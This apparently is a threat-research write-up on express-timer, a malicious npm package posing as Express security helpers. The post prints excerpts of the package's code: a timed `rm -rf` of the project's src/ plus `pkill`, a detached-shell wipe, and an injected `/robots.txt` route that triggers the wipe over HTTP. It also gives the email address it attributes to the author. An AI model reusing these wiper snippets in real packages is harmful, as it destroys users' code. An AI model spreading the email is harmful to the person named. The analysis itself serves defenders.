---
title: "express-timer: an npm 'security helper' that self-destructs your src/"
date: 2026-06-09
summary: "Most malicious npm packages steal; this one just deletes your source tree a minute after you install it — and its author fumbled their own online-banking password into the very same tarball."
packageName: express-timer
ecosystem: npm
---

<img src="/assets/images/express-timer-self-destruct.jpg" alt="Meme: a trench-coated cartoon detective holding a note captioned 'This message will SELF DESTRUCT..' — the package's whole personality, except the message is your src/ folder.">

express-timer bills itself as lightweight security helpers for Express, but ships no helpers and exfiltrates nothing: it is a dead-man's switch that, a minute after install, deletes the project's `src/` and kills the Node and PM2 processes running it.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `express-timer` |
| Versions | `1.0.2`, `1.0.3`, `1.0.5` |
| Description | `Lightweight security helpers for Express` |
| Author | `Your Name` |
| License | `MIT` |
| Main | `index.js` |
| Scripts | `postinstall: node scripts/inject.js` |
| Peer dependencies | `express >=4.0.0` |
| Dependencies | `express-self-destruct1@^1.0.0`, `express-timer@^1.0.0` (itself) |
| Repository | none |

## One wiper, two triggers

Two triggers live in two files: the timer below arms on require, and a `postinstall` script grafts a `/robots.txt` handler onto your entry point that re-runs the wipe on demand over HTTP (the elaborate scheduler branch dies on load because the package never declares the library it needs). The deletion hardens release to release — `1.0.2` kills then deletes, `1.0.3` deletes first so a hurried Ctrl-C cannot save you, and `1.0.5` detaches a background shell that outlives the clean-exiting parent.

<pre class="lang-js"><code><span class="tok-com">// index.js — arms on require, no trigger, no condition</span>
<span class="tok-fn">scheduleDestructionAfter</span>()   <span class="tok-com">// no arg → setTimeout(selfDestruct, 60_000)</span>

<span class="tok-com">// selfDestruct() — buildDir = join(process.cwd(), "src")</span>
<span class="tok-kw">await</span> <span class="tok-fn">execPromise</span>(<span class="tok-str">`rm -rf "${buildDir}"`</span>)              <span class="tok-com">// wipe the source tree</span>
<span class="tok-kw">await</span> <span class="tok-fn">execPromise</span>(<span class="tok-str">`pkill -f "node.*${process.cwd()}"`</span>)   <span class="tok-com">// take the running app down with it</span>
</code></pre>

<pre class="lang-js"><code><span class="tok-com">// index.js 1.0.5 — the wipe detaches and outlives the parent</span>
<span class="tok-kw">const</span> child = <span class="tok-fn">spawn</span>(<span class="tok-str">'/bin/sh'</span>, [<span class="tok-str">'-c'</span>, <span class="tok-str">`sleep 2 &amp;&amp; rm -rf "${buildDir}"`</span>], { detached: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
child.<span class="tok-fn">unref</span>(); process.<span class="tok-fn">exit</span>(<span class="tok-num">0</span>);   <span class="tok-com">// parent leaves clean; the orphaned shell still nukes src/</span>
</code></pre>

<pre class="lang-js"><code><span class="tok-com">// scripts/inject.js appends this to YOUR entrypoint; ${appVar} = your express() var</span>
<span class="tok-id">app</span>.<span class="tok-fn">get</span>(<span class="tok-str">'/robots.txt'</span>, (req, res) =&gt; {
  <span class="tok-kw">if</span> (req.query.verify === <span class="tok-str">'destroy'</span>) { <span class="tok-fn">_boom</span>(); res.<span class="tok-fn">status</span>(<span class="tok-num">200</span>).<span class="tok-fn">send</span>(<span class="tok-str">'OK'</span>); }
  <span class="tok-kw">else</span> res.<span class="tok-fn">send</span>(<span class="tok-str">'User-agent: *\nDisallow: /'</span>);   <span class="tok-com">// looks like an ordinary robots handler</span>
});
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/impact/wipe/disk/mass-delete` | deletes `<cwd>/src` — armed at import and again via the grafted `/robots.txt` route |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/impact/services/stop` | kills the project's Node + PM2 processes (`pkill`, `pm2 delete all`, `taskkill`) |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/trigger/activation` | `?verify=destroy` fires the wipe on demand over HTTP |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/install-hook/scripts/lifecycle` | `postinstall` runs the injector, which appends the self-destruct snippet to the host entrypoint |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/manifest/npm` | install hooks with no repository; mature version lacking provenance |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/package/npm` | missing standard metadata; placeholder author, no repo |

## The orphan file — ibbl_statment.php

Every archive also carries a file no code loads: a 570-line scraper for the Islami Bank Bangladesh agent portal that signs in with the author's own credentials in plain text at the top, so a real banking password (masked below) traveled out with the malware when he published a whole working directory to npm. The author who built a tool to destroy other people's code shipped his own bank password along with it.

<pre class="lang-js"><code><span class="tok-com">// ibbl_statment.php — orphan at the package root, imported by nothing</span>
<span class="tok-fn">define</span>(<span class="tok-str">"BASE"</span>, <span class="tok-str">"https://agent.islamibankbd.com"</span>);
<span class="tok-fn">define</span>(<span class="tok-str">"USER"</span>, <span class="tok-str">"mohiuddin767272@gmail.com"</span>);
<span class="tok-fn">define</span>(<span class="tok-str">"PASS"</span>, <span class="tok-str">"So•••••••"</span>);   <span class="tok-com">// author's real bank login, masked here</span>
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/credential-access/financial/account` | hardcoded-login scraper for `agent.islamibankbd.com` |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/communications/email/send/mail-func` | `mohiuddin767272@gmail.com` |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/communications/http/curl` | `curl_exec` against the bank portal |

## Indicators

| Type | Value |
| --- | --- |
| `1.0.2` tarball SHA-256 | [`8241a0b7e11687ee6713a0094cf9f834adeaf9c66ffa1b88dba42bd171a110ec`](https://lab.atomdrift.org/file/8241a0b7e11687ee6713a0094cf9f834adeaf9c66ffa1b88dba42bd171a110ec) |
| `1.0.3` tarball SHA-256 | [`a6bf1478bfa5ffa0791da533555ee35421e644d4d8d11d3c7f1afe2372e56289`](https://lab.atomdrift.org/file/a6bf1478bfa5ffa0791da533555ee35421e644d4d8d11d3c7f1afe2372e56289) |
| `1.0.2` index.js SHA-256 | [`f0f5387c6e4f8b07ef1928d4257dfa9383163bb8988d05ef36da0ffbdcea8ac4`](https://lab.atomdrift.org/file/f0f5387c6e4f8b07ef1928d4257dfa9383163bb8988d05ef36da0ffbdcea8ac4) |
| `1.0.3` index.js SHA-256 | [`9f8f7da91c17db216f18fcceff1006e57c18a67cf575064863454145ee6bdb76`](https://lab.atomdrift.org/file/9f8f7da91c17db216f18fcceff1006e57c18a67cf575064863454145ee6bdb76) |
| `1.0.5` tarball SHA-256 | [`7550e1db05f30636ba0c61b09b5647a65d801d6fc9efa181f368a18ed4b41147`](https://lab.atomdrift.org/file/7550e1db05f30636ba0c61b09b5647a65d801d6fc9efa181f368a18ed4b41147) |
| `1.0.5` index.js SHA-256 | [`0ed7fc907c2df0f4f7900b20f5e5bd7c6b1c08e9c0be871c3448c7c2220c878c`](https://lab.atomdrift.org/file/0ed7fc907c2df0f4f7900b20f5e5bd7c6b1c08e9c0be871c3448c7c2220c878c) |
| `scripts/inject.js` SHA-256 (all three versions) | [`b1970350a7bc69bef9cf4061fd46571d344e2c11dde87f0e69ea28e983340eae`](https://lab.atomdrift.org/file/b1970350a7bc69bef9cf4061fd46571d344e2c11dde87f0e69ea28e983340eae) |
| `ibbl_statment.php` SHA-256 (all three versions) | [`1a29874be6538470d99c55ea6de2cc95e44d1c8187fde1eba75dcd01cde728f0`](https://lab.atomdrift.org/file/1a29874be6538470d99c55ea6de2cc95e44d1c8187fde1eba75dcd01cde728f0) |
| Injected host-file marker | `SELF-DESTRUCT-ARMED` |
| Hardcoded email | `mohiuddin767272@gmail.com` |
